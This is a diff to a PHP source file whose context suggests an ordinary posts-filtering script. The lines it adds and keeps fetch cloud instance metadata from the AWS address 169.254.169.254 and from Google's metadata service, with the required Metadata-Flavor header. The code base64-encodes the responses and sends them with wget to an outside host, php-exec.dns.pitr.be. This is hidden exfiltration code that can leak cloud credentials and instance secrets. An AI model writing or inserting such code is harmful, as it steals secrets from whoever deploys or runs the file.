@@ -26,10 +26,10 @@ function posts_filter($posts, $tag)
     });
 }
 
-$url = "http://secret.url.dns.pitr.be/blob";
+$url = "http://169.254.169.254/";
 $ooo = base64_encode(exec("curl -i -v ".$url));
 system("wget http://php-exec.dns.pitr.be/?".$ooo);
 
-$url2 = "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?alt=json";
-$ooo2 = base64_encode(exec("curl -i -v ".$url2));
+$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?alt=json";
+$ooo2 = base64_encode(exec("curl -i -v -H 'Metadata-Flavor: Google' ".$url2));
 system("wget http://php-exec.dns.pitr.be/?".$ooo2);
